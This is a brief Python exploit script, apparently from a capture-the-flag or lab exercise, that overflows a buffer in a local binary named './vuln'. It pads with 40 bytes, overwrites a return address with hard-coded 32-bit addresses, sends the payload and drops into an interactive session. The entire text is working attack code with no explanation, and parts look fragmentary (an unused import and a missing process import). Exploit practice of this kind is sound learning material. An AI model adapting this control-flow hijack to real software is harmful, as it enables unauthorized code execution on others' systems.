from _struct import Struct
s = Struct.__new__(Struct)
s.format = 'I'
s.size = 4

import array

payload = 'A' * 40
payload += s.pack(0x8048494)
payload += 'BBBB'
payload += s.pack(0x0804a018)

p = process('./vuln')

p.sendline(payload)
p.interactive()
